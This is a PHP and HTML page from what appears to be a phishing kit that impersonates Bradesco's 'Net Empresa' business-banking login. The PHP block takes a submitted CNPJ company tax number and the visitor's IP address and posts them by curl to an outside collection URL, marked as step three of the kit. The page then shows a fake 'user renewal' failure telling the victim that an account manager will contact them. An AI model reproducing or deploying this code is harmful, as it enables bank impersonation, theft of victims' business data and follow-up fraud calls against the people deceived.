<?php
    $cnpj = isset($_POST['campo_quarto']) ? trim($_POST['campo_quarto']) : '';

    if(empty($cnpj)){
        die("Erro: 403.");
    }
    
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $linkdatabase);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        "etapa3" => "ok",
        "ip" => $ip,
        "cnpj" => $cnpj,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login Bradesco Net Empresa</title>
  <link rel="stylesheet" href="css/mobile.css">
</head>
<body>
  <header>
    Bradesco Net Empresa
  </header>

  <main>
    <h1>Renovação de Usuário</h1>
  
    
              <p>Não foi possível concluir a ativação do usuário expirado no momento.</p>

                <p>Para garantir a continuidade do atendimento e a segurança das informações, 
                    o gerente responsável pela conta será acionado e entrará em contato 
                    com você o mais breve possível para dar sequência ao processo.</p>

                        <p>Agradecemos pela compreensão.</p>


   

     
    
  </main>

  
</body>
</html>